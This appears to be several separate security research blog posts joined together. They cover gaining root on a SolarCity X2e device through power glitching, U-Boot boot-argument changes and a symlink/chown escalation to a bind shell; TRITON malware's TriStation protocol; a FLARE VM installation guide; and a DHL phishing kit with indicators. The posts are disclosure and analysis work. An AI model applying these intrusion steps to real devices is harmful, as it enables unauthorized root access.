increased understanding and coordinated action in countering APT network breaches. We recognize that no one entity can understand the entire complex picture that many years of intense cyber espionage by a single group creates. We look forward to seeing the surge of data and conversations a report like this will likely generate.

                "text": "In this post, we continue our analysis of the SolarCity ConnectPort X2e Zigbee device (referred to throughout as X2e device). In Part One , we discussed the X2e at a high level, performed initial network-based attacks, then discussed the hardware techniques used to gain a remote shell on the X2e device as a non-privileged system user. In this segment, we’ll cover how we obtained a privileged shell on the device locally using power glitching attacks, and explore CVE-2020-12878 , a vulnerability we discovered that permitted remote privilege escalation to the root user. Combined with CVE-2020-9306 (discussed in Part One), this would result in a complete remote compromise of the X2e device. Technical Analysis Recap Before we dive into next steps, let’s recap where we left off: The X2e has an exposed universal asynchronous transmit/receive (UART) interface, which allows a physically connected user to view (but not interrupt) the Das U-Boot (U-Boot) boot process, and given proper credentials, authenticate to the Linux operating system. Since we do not have root credentials, we put this thread on the backburner. We have a full NAND dump of the Spansion raw flash, which includes boot configuration, bootloader firmware, filesystems, and the Linux kernel image. This was used previously in Part One to obtain the hardcoded credential for the python user. Knowing that UART is present and access to the bootloader would be extremely valuable, we decided to revisit that thread. Gaining Privileged Access Locally Revisiting the Bootloader Figure 1 shows the U-Boot boot process displayed while connected via UART connection. In some cases, it is possible to send keyboard input to the device during a set period (usually one to four seconds) when the bootloader presents the message, “Hit any key to stop autoboot,” which interrupts the boot process and drops the user into a U-Boot shell. On the X2e, this feature has been disabled by setting the U-Boot configuration parameter CONFIG_BOOTDELAY to 0 . Figure 1: Uninterruptable U-Boot bootloader output One attack that has been documented to be successful to disrupt autoboot is to manipulate the bootloader’s ability to access the flash storage during the boot process. In certain circumstances where the U-Boot bootloader is unable to access its own configuration, it fails into a default environment, which may be less restricted. We decided to see if this would be possible on the X2e. These attacks, known as glitch attacks (or more officially known as fault-injection), are a type of side channel attack that attempts to cause a microcontroller unit (MCU) to skip instructions, perform wrong instructions, or fail to access flash memory . Various types of glitching attacks exist including electrical, thermal, and radiation. Based on our objective, we opted to try glitching the power between the MCU and the Spansion NAND flash. Note that glitch attacks can often cause damage to the components on a board or put the device in an unusable state. These types of attacks should be tested as either a last resort or against a secondary device you are comfortable with damaging. Glitching the Bootloader Based on previous research in this domain , we opted to target the data lines (I/O) between the MCU and NAND flash. Recall from Part One that the NAND flash on the X2e was the Spansion S34ML01G1, which was a 63-pin ball grid array (BGA) package. This chip is capable of supporting both 8-bit and 16-bit bus width, which corresponds to the number of I/O lines utilized. By using the datasheet for the flash and then querying the ONFI Device ID of our chip, we determined our chip was utilizing the 8-bit configuration, meaning eight I/O lines were present between the NAND flash and the MCU. For this attack, we focused on manipulating the power on the first ( I/O0 ) data line. Figure 2 shows the configuration of the BGA-63 pins, with I/O0 highlighted. Figure 2: Identifying I/O0 for NAND chip in the Spansion datasheet Because the pins are actually underneath the flash package, we needed to find an exposed lead that corresponded to I/O0 elsewhere on the PCB. One such method for tracing connections across a PCB is a continuity test. A continuity test (using a multimeter) sends a low current electrical signal across two points and produces an audible beep if the points are connected. Using this technique, we located an exposed test point (known as a via) on the bottom of the PCB. Figure 3 shows the I/O0 pin on the top of the PCB (under the NAND chip), and Figure 4 shows the I/O0 pin exposed on the bottom of the PCB. Figure 3: I/O0 on top of PCB (under NAND chip) Figure 4: I/O0 on bottom of PCB With exposed access to I/O0 located, we experimented with connecting this pin directly to a known ground ( GND ) pin at various points during the boot process. Figure 5 shows the device powering on with the metal tweezers connecting I/O0 to GND . Figure 5: Shorting I/O0 to GND While connected to the UART interface, we noted several different outcomes. When shorting the pin immediately after powering on, the device failed to produce any output or boot. When shorting after the bootloader finished loading (and handing off to the Linux kernel), the device would also force reboot. However, when timed perfectly between the bootloader loading and attempting to read its configuration, we noted that the bootloader would present different output, and the option to interrupt the boot process was possible with a four-second delay. By pressing keyboard input, we were successfully able to drop into a U-Boot shell, which is shown in Figure 6. Figure 6: Access to U-Boot bootloader shell While this was great progress, we noted that the current failback bootloader configuration was completely inoperable and certain NAND blocks had been marked as bad (as expected). To get our device back to a working state, we needed to revisit the NAND dump we generated in Part One. Repairing the Bootloader Configuration While the current configuration provided us a working shell, we needed to fix the damage we had done. This was performed in two steps: fixing the mistakenly marked bad blocks and then rebuilding the configuration. In our case, the nand utility and its sub-commands read , write , and scrub allowed us to inspect and manipulate pages and blocks of the NAND. The nand scrub command with a valid offset and size could be used to completely reset a segment of the NAND, which removed any bad block markers. The next challenge was determining what needed to be replaced in the damaged blocks and rebuilding the configuration. Since we had a valid NAND image, we revisited the sections read by the bootloader to determine what changes were needed. The format did not match a known format, so we wrote a simple parser in Python to read the binary structure, shown in Figure 7. Figure 7: Parsing bootloader nvram configuration from flash With details of how the configuration should look, we used the nand write to rebuild this section, byte by byte with the correct details. We also set the boot delay to be four seconds, so that we could always interrupt the bootloader once the new configuration was committed. Once we confirmed our changes were stable, we saved the configuration to flash and could access the bootloader without performing the aforementioned glitch attack. Accessing Linux as root User Now that we have unrestricted access to the bootloader, we can finally influence the rest of the boot process and achieve a privileged shell. We alluded to this in Part One, but the easiest way to turn an unlocked U-Boot shell into a root Linux shell is to adjust the boot arguments that U-Boot passes to the Linux kernel. In our case, this was accomplished by using the setenv utility to change the std_bootarg environment variable to be init=/bin/sh and instructing U-Boot to resume the standard boot process. Figure 8 shows the Linux shell presented over UART. Figure 8: root shell after bootloader At this point, we’ve demonstrated a repeatable method for achieving local privilege escalation. In the final segment, we’ll complete our attack by exploring an avenue to remotely escalate privileges. Gaining Privileged Access Remotely Since the X2e has only two available listening network services, it makes sense to reinvestigate these services. During Part One, we identified hardcoded credentials for the limited user python . This was useful for initial probing of the device while it was running, but where do we go from here? Embedded devices typically only have a handful of users, with a majority of functionality being performed by the root user. This presents an interesting opportunity for us to abuse overlap between actions performed by the root user on contents owned and controlled by the python user. By reviewing the boot process, we noted a large number of custom init scripts in the /etc/init.d/ directory. These scripts are executed at system start by the root user and were responsible for starting daemons and ensuring directories or files exist. One file in particular, /etc/init.d/S50dropbear.sh , was interesting to us, as it appeared to perform a number of actions on files within the directory specified by the $PYTHON_HOME variable, which was /WEB/python/ , shown in Figure 9. Figure 9: Unsafe operations on $PYTHON_HOME directory At first glance this may seem benign but considering that the /WEB/python/ directory is controllable by the python user, it means that we can potentially control actions taken by root . More specifically, the chown operation is dangerous, as the previous mkdir command can fail silently and result in an unsafe chown operation. To weaponize this, we can use symbolic links to point the /WEB/python/.ssh/ to other areas of the filesystem and coerce the root process into chown ’ing these files to be owned by the python user. The process we took to exploit this was as follows: Authenticate over SSH using hardcoded python user credentials. Create a symbolic link, /WEB/python/.ssh , that points to /etc/init.d/ . Reboot the X2e, forcing the system to re-execute /etc/init.d/S50dropbear.sh . After boot completes, create a malicious init script in /etc/init.d/ as the python user. Reboot the X2e, forcing the system to execute the new init script. While not the cleanest approach (it requires two reboots), it accomplishes the goal of achieving code execution as root . Figure 10 shows the output of our proof of concept. In this case, our malicious init script spawned a bind shell on TCP port 8080, so that we could connect in as root . Figure 10: Exploiting chown vulnerability to gain shell as user root And there we have it: a remote connection as root, by abusing two separate vulnerabilities. While not explored in this series, another viable avenue of attack would be to explore potential vulnerabilities in the web server listening on TCP ports 80 and 443; however, this was not an approach that we took. Conclusion We covered a wide variety of topics in this two-part series, including: Physical device inspection Identifying and exploring physical debugging interfaces (UART) Chip-off techniques to remove the NAND storage Binary analysis of the filesystems and bootloader configurations Power glitch attacks against the U-Boot bootloader Linux user space privilege escalation We hope that readers were able to learn from our experiences with the X2e and will be inspired to use these techniques in their own analysis. Finally, Mandiant would like to thank both Tesla/SolarCity and Digi International for their efforts to remediate these vulnerabilities and for their cooperation with releasing this blog series.

                "text": "Introduction In December 2017, FireEye's Mandiant discussed an incident response involving the TRITON framework . The TRITON attack and many of the publicly discussed ICS intrusions involved routine techniques where the threat actors used only what is necessary to succeed in their mission. For both INDUSTROYER and TRITON, the attackers moved from the IT network to the OT (operational technology) network through systems that were accessible to both environments. Traditional malware backdoors, Mimikatz distillates, remote desktop sessions, and other well-documented, easily-detected attack methods were used throughout these intrusions. Despite the routine techniques employed to gain access to an OT environment, the threat actors behind the TRITON malware framework invested significant time learning about the Triconex Safety Instrumented System (SIS) controllers and TriStation, a proprietary network communications protocol. The investment and purpose of the Triconex SIS controllers leads Mandiant to assess the attacker's objective was likely to build the capability to cause physical consequences. TriStation remains closed source and there is no official public information detailing the structure of the protocol, raising several questions about how the TRITON framework was developed. Did the actor have access to a Triconex controller and TriStation 1131 software suite? When did development first start? How did the threat actor reverse engineer the protocol, and to what extent? What is the protocol structure? FireEye’s Advanced Practices Team was born to investigate adversary methodologies, and to answer these types of questions, so we started with a deeper look at the TRITON’s own Python scripts. Glossary: TRITON – Malware framework designed to operate Triconex SIS controllers via the TriStation protocol. TriStation – UDP network protocol specific to Triconex controllers. TRITON threat actor – The human beings who developed, deployed and/or operated TRITON. Diving into TRITON's Implementation of TriStation TriStation is a proprietary network protocol and there is no public documentation detailing its structure or how to create software applications that use TriStation. The current TriStation UDP/IP protocol is little understood, but natively implemented through the TriStation 1131 software suite. TriStation operates by UDP over port 1502 and allows for communications between designated masters (PCs with the software that are “engineering workstations”) and clients (Triconex controllers with special communications modules) over a network. To us, the Triconex systems, software and associated terminology sound foreign and complicated, and the TriStation protocol is no different. Attempting to understand the protocol from ground zero would take a considerable amount of time and reverse engineering effort – so why not learn from TRITON itself? With the TRITON framework containing TriStation communication functionality, we pursued studying the framework to better understand this mysterious protocol. Work smarter, not harder, amirite? The TRITON framework has a multitude of functionalities, but we started with the basic components: TS_cnames.pyc # Compiled at: 2017-08-03 10:52:33 TsBase.pyc # Compiled at: 2017-08-03 10:52:33 TsHi.pyc # Compiled at: 2017-08-04 02:04:01 TsLow.pyc # Compiled at: 2017-08-03 10:46:51 TsLow.pyc (Figure 1) contains several pieces of code for error handling, but these also present some cues to the protocol structure. Figure 1: TsLow.pyc function print_last_error() In the TsLow.pyc’s function for print_last_error we see error handling for “TCM Error”. This compares the TriStation packet value at offset 0 with a value in a corresponding array from TS_cnames.pyc (Figure 2), which is largely used as a “dictionary” for the protocol. Figure 2: TS_cnames.pyc TS_cst array From this we can infer that offset 0 of the TriStation protocol contains message types. This is supported by an additional function, tcm_result, which declares type, size = struct.unpack('<HH', data_received[0:4]), stating that the first two bytes should be handled as integer type and the second two bytes are integer size of the TriStation message. This is our first glimpse into what the threat actor(s) understood about the TriStation protocol. Since there are only 11 defined message types, it really doesn't matter much if the type is one byte or two because the second byte will always be 0x00. We also have indications that message type 5 is for all Execution Command Requests and Responses, so it is curious to observe that the TRITON developers called this “Command Reply.” (We won’t understand this naming convention until later.) Next we examine TsLow.pyc’s print_last_error function (Figure 3) to look at “TS Error” and “TS_names.” We begin by looking at the ts_err variable and see that it references ts_result. Figure 3: TsLow.pyc function print_last_error() with ts_err highlighted We follow that thread to ts_result, which defines a few variables in the next 10 bytes (Figure 4): dir, cid, cmd, cnt, unk, cks, siz = struct.unpack('<, ts_packet[0:10]). Now things are heating up. What fun. There’s a lot to unpack here, but the most interesting thing is how this piece script breaks down 10 bytes from ts_packet into different variables. Figure 4: ts_result with ts_packet header variables highlighted Figure 5: tcm_result Referencing tcm_result (Figure 5) we see that it defines type and size as the first four bytes (offset 0 – 3) and tcm_result returns the packet bytes 4:-2 (offset 4 to the end minus 2, because the last two bytes are the CRC-16 checksum). Now that we know where tcm_result leaves off, we know that the ts_reply “cmd” is a single byte at offset 6, and corresponds to the values in the TS_cnames.pyc array and TS_names (Figure 6). The TRITON script also tells us that any integer value over 100 is a likely “command reply.” Sweet. When looking back at the ts_result packet header definitions, we begin to see some gaps in the TRITON developer's knowledge: dir, cid, cmd, cnt, unk, cks, siz = struct.unpack('<, ts_packet[0:10]). We're clearly speculating based on naming conventions, but we get an impression that offsets 4, 5 and 6 could be \"direction\", \"controller ID\" and \"command\", respectively. Values such as \"unk\" show that the developer either did not know or did not care to identify this value. We suspect it is a constant, but this value is still unknown to us. Figure 6: Excerpt TS_cnames.pyc TS_names array, which contain TRITON actor’s notes for execution command function codes TriStation Protocol Packet Structure The TRITON threat actor’s knowledge and reverse engineering effort provides us a better understanding of the protocol. From here we can start to form a more complete picture and document the basic functionality of TriStation. We are primarily interested in message type 5, Execution Command, which best illustrates the overall structure of the protocol. Other, smaller message types will have varying structure. Figure 7: Sample TriStation \"Allocate Program\" Execution Command, with color annotation and protocol legend Corroborating the TriStation Analysis Minute discrepancies aside, the TriStation structure detailed in Figure 7 is supported by other public analyses. Foremost, researchers from the Coordinated Science Laboratory (CSL) at University of Illinois at Urbana-Champaign published a 2017 paper titled \" Attack Induced Common-Mode Failures on PLC-based Safety System in a Nuclear Power Plant\". The CSL team mentions that they used the Triconex System Access Application (TSAA) protocol to reverse engineer elements of the TriStation protocol. TSAA is a protocol developed by the same company as TriStation. Unlike TriStation, the TSAA protocol structure is described within official documentation. CSL assessed similarities between the two protocols would exist and they leveraged TSAA to better understand TriStation. The team's overall research and analysis of the general packet structure aligns with our TRITON-sourced packet structure. There are some awesome blog posts and whitepapers out there that support our findings in one way or another. Writeups by Midnight Blue Labs , Accenture , and US-CERT each explain how the TRITON framework relates to the TriStation protocol in superb detail. TriStation's Reverse Engineering and TRITON's Development When TRITON was discovered, we began to wonder how the TRITON actor reverse engineered TriStation and implemented it into the framework. We have a lot of theories, all of which seemed plausible: Did they build, buy, borrow, or steal? Or some combination thereof? Our initial theory was that the threat actor purchased a Triconex controller and software for their own testing and reverse engineering from the \"ground up\", although if this was the case we do not believe they had a controller with the exact vulnerable firmware version, else they would have had fewer problems with TRITON in practice at the victim site. They may have bought or used a demo version of the TriStation 1131 software, allowing them to reverse engineer enough of TriStation for the framework. They may have stolen TriStation Python libraries from ICS companies, subsidiaries or system integrators and used the stolen material as a base for TriStation and TRITON development. But then again, it is possible that they borrowed TriStation software, Triconex hardware and Python connectors from government-owned utility that was using them legitimately. Looking at the raw TRITON code, some of the comments may appear oddly phrased, but we do get a sense that the developer is clearly using many of the right vernacular and acronyms, showing smarts on PLC programming. The TS_cnames.pyc script contains interesting typos such as 'Set lable', 'Alocate network accepted', 'Symbol table ccepted' and 'Set program information reponse'. These appear to be normal human error and reflect neither poor written English nor laziness in coding. The significant amount of annotation, cascading logic, and robust error handling throughout the code suggests thoughtful development and testing of the framework. This complicates the theory of \"ground up\" development, so did they base their code on something else? While learning from the TriStation functionality within TRITON, we continued to explore legitimate TriStation software. We began our search for \"TS1131.exe\" and hit dead ends sorting through TriStation DLLs until we came across a variety of TriStation utilities in MSI form. We ultimately stumbled across a juicy archive containing \"Trilog v4.\" Upon further inspection, this file installed \"TriLog.exe,\" which the original TRITON executable mimicked, and a couple of supporting DLLs, all of which were timestamped around August 2006. When we saw the DLL file description \"Tricon Communications Interface\" and original file name \"TricCom.DLL\", we knew we were in the right place. With a simple look at the file strings, \"BAZINGA!\" We struck gold. File Name tr1com40.dll MD5 069247DF527A96A0E048732CA57E7D3D Size 110592 Compile Date 2006-08-23 File Description Tricon Communications Interface Product Name TricCom Dynamic Link Library File Version 4.2.441 Original File Name TricCom.DLL Copyright Copyright © 1993-2006 Triconex Corporation The tr1com40.DLL is exactly what you would expect to see in a custom application package. It is a library that helps support the communications for a Triconex controller. If you've pored over TRITON as much as we have, the moment you look at strings you can see the obvious overlaps between the legitimate DLL and TRITON's own TS_cnames.pyc. Figure 8: Strings excerpt from tr1com40.DLL Each of the execution command \"error codes\" from TS_cnames.pyc are in the strings of tr1com40.DLL (Figure 8). We see \"An MP has re-educated\" and \"Invalid Tristation I command\". Even misspelled command strings verbatim such as \"Non-existant data item\" and \"Alocate network accepted\". We also see many of the same unknown values. What is obvious from this discovery is that some of the strings in TRITON are likely based on code used in communications libraries for Trident and Tricon controllers. In our brief survey of the legitimate Triconex Corporation binaries, we observed a few samples with related string tables.

TS_cnames.pyc TS_names and tr1com40.dll share 202 of 220 combined table strings. The remaining strings are unique to each, as seen here: TS_cnames.TS_names (2017 pyc) Tr1com40.dll (2006 CPP) Go to DOWNLOAD mode <200> Not set <209> Unk75 Bad message from module Unk76 Bad message type Unk77 Bad TMI version number Unk78 Module did not respond Unk79 Open Connection: Invalid SAP %d Unk81 Unsupported message for this TMI version Unk83 Wrong command TS_cnames.pyc TS_names and Tridcom.dll (1999 CPP) shared only 151 of 268 combined table strings, showing a much smaller overlap with the seemingly older CPP library. This makes sense based on the context that Tridcom.dll is meant for a Trident controller, not a Tricon controller. It does seem as though Tr1com40.dll and TR1STRS.CPP code was based on older work. We are not shocked to find that the threat actor reversed legitimate code to bolster development of the TRITON framework. They want to work smarter, not harder, too. But after reverse engineering legitimate software and implementing the basics of the TriStation, the threat actors still had an incomplete understanding of the protocol. In TRITON's TS_cnames.pyc we saw \"Unk75\", \"Unk76\", \"Unk83\" and other values that were not present in the tr1com40.DLL strings, indicating that the TRITON threat actor may have explored the protocol and annotated their findings beyond what they reverse engineered from the DLL. The gaps in TriStation implementation show us why the actors encountered problems interacting with the Triconex controllers when using TRITON in the wild.

Moving forward it would be reasonable to anticipate additional frameworks, such as TRITON, designed for usage against other SIS controllers and associated technologies. If Triconex was within scope, we may see similar attacker methodologies affecting the dominant industrial safety technologies. Basic security measures do little to thwart truly persistent threat actors and monitoring only IT networks is not an ideal situation. Visibility into both the IT and OT environments is critical for detecting the various stages of an ICS intrusion. Simple detection concepts such as baseline deviation can provide insight into abnormal activity. While the TRITON framework was actively in use, how many traditional ICS “alarms” were set off while the actors tested their exploits and backdoors on the Triconex controller? How many times did the TriStation protocol, as implemented in their Python scripts, fail or cause errors because of non-standard traffic? How many TriStation UDP pings were sent and how many Connection Requests? How did these statistics compare to the baseline for TriStation traffic? There are no answers to these questions for now. We believe that we can identify these anomalies in the long run if we strive for increased visibility into ICS technologies. We hope that by holding public discussions about ICS technologies, the Infosec community can cultivate closer relationships with ICS vendors and give the world better insight into how attackers move from the IT to the OT space. We want to foster more conversations like this and generally share good techniques for finding evil. Since most of all ICS attacks involve standard IT intrusions, we should probably come together to invent and improve any guidelines for how to monitor PCs and engineering workstations that bridge the IT and OT networks. We envision a world where attacking or disrupting ICS operations costs the threat actor their cover, their toolkits, their time, and their freedom. It's an ideal world, but something nice to shoot for. Thanks and Future Work There is still much to do for TRITON and TriStation. There are many more sub-message types and nuances for parsing out the nitty gritty details, which is hard to do without a controller of our own. And although we’ve published much of what we learned about the TriStation here on the blog, our work will continue as we continue our study of the protocol. Thanks to everyone who did so much public research on TRITON and TriStation. We have cited a few individuals in this blog post, but there is a lot more community-sourced information that gave us clues and leads for our research and testing of the framework and protocol. We also have to acknowledge the research performed by the TRITON attackers. We borrowed a lot of your knowledge about TriStation from the TRITON framework itself. Finally, remember that we're here to collaborate. We think most of our research is right, but if you notice any errors or omissions, or have ideas for improvements, please spear phish contact: smiller@fireeye.com.

                "text": "FLARE VM is the first of its kind reverse engineering and malware analysis distribution on Windows platform. Since its introduction in July 2017 , FLARE VM has been continuously trusted and used by many reverse engineers, malware analysts, and security researchers as their go-to environment for analyzing malware. Just like the ever-evolving security industry, FLARE VM has gone through many major changes to better support our users’ needs. FLARE VM now has a new installation, upgrade, and uninstallation process, which is a long anticipated feature requested by our users. FLARE VM also includes many new tools such as IDA 7.0, radare and YARA. Therefore, we would like to share these updates, especially the new installation process. Installation We strongly recommend you use FLARE VM within a virtualized environment for malware analysis to protect and isolate your physical device and network from malicious activities. We assume you already have experience setting up and configuring your own virtualized environment. Please create a new virtual machine (VM) and perform a fresh installation of Windows. FLARE VM is designed to be installed on Windows 7 Service Pack 1 or newer; therefore, you can select a version of windows that best suits your needs. From this point forward, all installation steps should be performed within your VM. Once you have a VM with a fresh installation of Windows, use one of the following URLs to download the compressed FLARE VM repository onto your VM: https://github.com/fireeye/flare-vm https://flarevm.info Figure 1: Download FLARE VM repo Then, use the following steps to install FLARE VM: Decompress the FLARE VM repository to a directory of your choosing. Start a new session of PowerShell with escalated privileges. FLARE VM attempts to install additional software and modify system settings; therefore, escalated privileges are required for installation. Within PowerShell, change directory to the location where you have decompressed the FLARE VM repository. Enable unrestricted execution policy for PowerShell by executing the following command and answering “Y” when prompted by PowerShell: Set-ExecutionPolicy unrestricted Execute the install.ps1 installation script. You will be prompted to enter the current user’s password. FLARE VM needs the current user’s password to automatically login after a reboot when installing. Optionally, you can specify the current user’s password by passing the “-password <current_user_password>” at the command line. Figure 2: Start PowerShell as administrator Figure 3: Ready to install FLARE VM The rest of the installation process is fully automated. Depending upon your internet speed the entire installation may take up to one hour to finish. The VM also reboots multiple times due to the numerous software installations’ requirements. Once the installation completes, the PowerShell prompt remains open waiting for you to hit any key before exiting. After completing the installation, you will be presented with the following desktop environment: Figure 4: FLARE VM installation completes Congratulations! You have successfully installed FLARE VM. At this point we recommend you power off the VM, switch the VM networking mode to Host-Only, and then take a snapshot to save a clean state of your analysis VM. Improvement The biggest improvement for FLARE VM is the ability to perform a proper update and uninstallation. The older version of FLARE VM came as a PowerShell script to install many chocolatey packages, one at a time; therefore, we were unable to include new packages when updating FLARE VM. In the past, our users had to reinstall FLARE VM completely, which is time consuming, or manually install the new package, which is error prone. To solve this issue, we have converted FLARE VM itself into a chocolatey package. Whenever a new tool is available we will also release a new version of FLARE VM. With this new design we can simply execute “choco upgrade all” to get the newest version of FLARE VM along with any new packages we have released. You can also safely uninstall all FLARE VM packages by executing “choco uninstall flarevm.installer.flare”. Our new FLARE VM is also updated to use Python 3.7 as the default Python interpreter. As a result, many python scripts may fail to execute. To maintain support for older scripts, we keep Python 2.7 installed in parallel with Python 3.7. We can easily switch between different versions by using the Python launcher. Run “py -2.7 <path_to_python_script>” to use Python 2.7, or “py <path_to_python_script>” to use the default Python 3.7 interpreter. For more details on the Python launcher, please refer to the following URL: https://docs.python.org/3/using/windows.html#launcher. Additionally, the new FLARE VM changes the location where Fakenet-NG saves its output when launched via the shortcut in the FLARE folder or taskbar pin. Instead of saving directly to the desktop, to reduce clutter, Fakenet-NG will store all its output in “Desktop\\fakenet_logs”. Compared to older versions this version of FLARE VM comes with many new tools and software packages. Most notably, this release adds the following: IDA Free 7.0 radare2 to support 64-bit disassembly The labs for the Practical Malware Analysis book pdfid, pdf-parser, and PdfStreamdumper to analyze malicious PDF documents The Malcode Analyst Pack Yara for signature matching The Cygwin Linux environment on windows PowerShell transcription and script block logging PowerShell transcripts can be found in “Desktop\\PS_Transcripts” Available Packages While we attempt to make the tools available as shortcuts within the FLARE folder, there are several available from command-line only. Please see the online documentation for the most up to date list. Here is an incomplete list of some major tools available on FLARE VM: Disassemblers: IDA Free 5.0 and IDA Free 7.0 Binary Ninja Radare2 and Cutter Debuggers: OllyDbg and OllyDbg2 x64dbg Windbg File Format parser: CFF Explorer, PEView, PEStudio PdfStreamdumper, pdf-parser, pdfid ffdec offvis and officemalscanner PE-bear Decompilers: RetDec Jd-gui and bytecode-viewer dnSpy IDR VBDecompiler Py2ExeDecompiler Monitoring tools: SysInternal suite RegShot Utilities: Hex Editors (010 editor, HxD and File Insight) FLOSS (FireEye Labs Obfuscated String Solver) Fakenet-NG Yara Malware Analyst Pack Conclusion The FLARE team continues to support and improve FLARE VM to be the de facto distribution for security research, incident response, and malware analysis on Windows platform. We greatly appreciate the numerous bug reports, tool requests, and feature recommendations from everyone. We hope FLARE VM, along with many other FLARE open source projects, can help you do your work better, easier, and faster. We are always looking for talented folks to join our team. The FLARE Team may be a good place for you if: You eat, sleep, and speak disassembly and malware all day long. You would like to push the state of the art for reverse engineering and malware analysis. Please check out our careers page , or send us an email. Happy Reversing!

                "text": "FireEye Email Security recently encountered various phishing campaigns, mostly in the Americas and Europe, using source code obfuscation with compromised or bad domains. These domains were masquerading as authentic websites and stole personal information such as credit card data. The stolen information was then shared to cross-platform, cloud-based instant messaging applications. Coming off a busy holiday season with a massive surge in deliveries, this post highlights a phishing campaign involving a fake DHL tracking page. While phishing attacks targeting users of shipping services is not new, the techniques used in these examples are more complex than what would be found in an off-the-shelf phishing kit. This campaign uses a WOFF-based substitution cypher, localization specific targeting, and various evasion techniques which we unravel here in this blog. Attack Flow The attack starts with an email imitating DHL, as seen in Figure 1 . The email tries to trick the recipient into clicking on a link, which would take them to a fake DHL website. In Figure 2, we can see the fake page asking for credit card details that, if submitted, would give the user a generic response while in the background the credit card data is shared with the attackers. Figure 1: DHL phishing attempt Figure 2: Fake website imitating DHL tracking This DHL phishing campaign uses a rare technique for obfuscating its source page. The page source contains proper strings, valid tags, and appropriate formatting, but contains encoded text that would render gibberish without decoding prior to loading the page, as seen in Figure 3. Typically, decoding such text is done by including script functions within the code. Yet in this case, the decoding functions are not contained in the script. Figure 3: Snippet of the encoded text on page source The decoding is done by a Web Open Font Format (WOFF) font file, which happens upon loading the page in a browser and will not be visible in the page content itself. Figure 4 shows the substitution cipher method and the WOFF font file. The attacker does this to evade detection by security vendors. Many security vendors use static or regex signature-based rules, so this method will break those naïve-based conditions. Figure 4: WOFF substitution cipher Loading this custom font which decodes the text is done inside the Cascading Style Sheets (CSS). This technique is rare as JavaScript functions are traditionally used to encrypt and decrypt HTML text. Figure 5: CSS file for loading WOFF font file Figure 5 shows the CSS file used to load the WOFF font file. We have also seen the same CSS file, style.css, being hosted on the following domains: hxxps://www.lifepointecc[.]com/wp-content/sinin/style.css hxxps://candyman-shop[.]com/auth/DHL_HOME/style.css hxxps://mail.rsi-insure[.]com/vendor/ship/dhexpress/style.css hxxps://www.scriptarticle[.]com/thro/HOME/style.css These legitimate-looking domains are not hosting any phishing websites as of now; instead, they appear to be a repository for attackers to use in their phishing campaigns. We have seen similar phishing attacks targeting the banking sector in the past, but this is newer for delivery websites. Notable Techniques Localization The phishing page displays the local language based on the region of the targeted user. The localization code (Figure 6) supports major languages spoken in Europe and the Americas such as Spanish, English, and Portuguese. Figure 6: Localization code The backend contains PHP resource files for each supported language (Figure 7), which are picked up dynamically based on the user’s IP address location. Figure 7: Language resource files Evasion This campaign employs a variety of techniques to evade detection. This will not serve up a phishing page if the request came from certain blocked IP addresses. The backend code (Figure 8) served the users with a \"HTTP/1.1 403 Forbidden\" response header under the following conditions: IP has been seen five times (AntiBomb_User func) IP host resolves to its list of avoided host names ('google', 'Altavista', 'Israel', 'M247', 'barracuda', 'niw.com.au' and more) (AntiBomb_WordBoot func) IP is on its own local blocklist csv (x.csv in the kit) (AntiBomb_Boot func) IP has seen POSTing three times (AntiBomb_Block func) Figure 8: Backend evasion code After looking at the list of blocked hosts, we could deduce that the attackers were trying to block web crawlers. Data Theft The attackers behind this phishing campaign attempted to steal credentials, credit card data, and other sensitive information. The stolen data is sent to email addresses and Telegram channels controlled by the attacker. We uncovered a Telegram channel where data is being sent using the Telegram Bot API shown in Figure 9. Figure 9: Chat log While using php mail() function to send stolen credentials is quite common, in the near past, encrypted instant messaging applications such as Telegram have been used for sending phished information back to command and control servers. We were able to access one of the Telegram channels controlled by the attacker as shown in Figure 10. The sensitive information being sent in the chat includes IP addresses and credit card data. Figure 10: Telegram channel with stolen information Conclusion Attackers (and especially phishers) are always on the hunt for new ways to evade detection by security products. Obfuscation gives the attackers an edge, and makes it harder for security vendors to protect their customers. By using instant messaging applications, attackers get user data in real time and victims have little to respond once their personal information is compromised. Indicators of Compromise (IOC) FireEye Email Security utilizing FAUDE (FireEye Advanced URL Detection Engine) protects customers from these types of phishing threats. Unlike traditional anti-phishing techniques dependent on static inspection of phishing URL content, FAUDE uses multiple artificial intelligence (AI) and machine learning (ML) engines to more effectively thwart these attacks. From December 2020 until the time of posting, our FAUDE detection engine saw more than 100 unique URLs hosting DHL phishing pages with obfuscated source code, including: hxxps://bit[.]ly/2KJ03RH hxxps://greencannabisstore[.]com/0258/redirect-new.php hxxps://directcallsolutions[.]co[.]za/CONTACT/DHL_HOME/ hxxps://danapluss[.]com/wp-admin/dhl/home/ hxxp://r.cloudcyberlink[.]digital/<path> (multiple paths using same domain) Email Addresses medmox2k@yandex[.]com o.spammer@yandex[.]com cameleonanas2@gmail[.]com Telegram Users @Saitama330 @cameleon9 style.css Md5: 83b9653d14c8f7fb95d6ed6a4a3f18eb) Sha256: D79ec35dc8277aff48adaf9df3ddd5b3e18ac7013e8c374510624ae37cdfba31 font-woff2 MD5: b051d61b693c76f7a6a5f639177fb820 SHA-256: 5dd216ad75ced5dd6acfb48d1ae11ba66fb373c26da7fc5efbdad9fd1c14f6e3 Domains Pradosdemojanda[.]com global-general-trackks.supercarhiredubai[.]com tracking-dhi.company Tapolarivercamp[.]com Rosariumvigil[.]com Mydhlexpert[.]com Autorepairbyfradel[.]com URLs hxxps://wantirnaosteo[.]com[.]au/logon/home/MARKET/F004f19441/11644210b.php hxxps://ekartenerji[.]com[.]tr/wp-admin/images/dk/DHL/home.php hxxps://aksharapratishthan[.]org/admin/imagess/F004f19441/sms1.php hxxps://royalgateedu[.]com/wp-content/plugins/elementor/includes/libraries/infos/package/F004f19441/00951124a.php hxxps://vandahering[.]com[.]br/htacess hxxps://hkagc[.]com/man/age/F004f19441/11644210b.php hxxps://fiquefitnes[s]comsaude[.]com/.well-known/MARKET/MARKET/F004f19441/11644210b.php hxxps://juneispearlmonth[.]com/-/15454874518741212/dhl-tracking/F004f19441/00951124a.php hxxps://www.instantcopywritingscript[.]com/blog/wp-content/22/DHL/MARKET hxxps://isss[.]sjs[.]org[.]hk/wp-admin/includes/F004f19441/11644210b.php hxxps://www.concordceramic[.]com/fr/frais/F004f19441/11644210b.php hxxps://infomediaoutlet[.]com/oldsite/wp-content/uploads/2017/02/MARKET/ hxxps://wema-wicie[.]pl/dh/l/en/MARKET hxxps://www.grupoindustrialsp[.]com/DHL/MARKET/ hxxps://marrecodegoias[.]com[.]br/wp-snapshots/activat/MARKET/F004f19441/11644210b.php 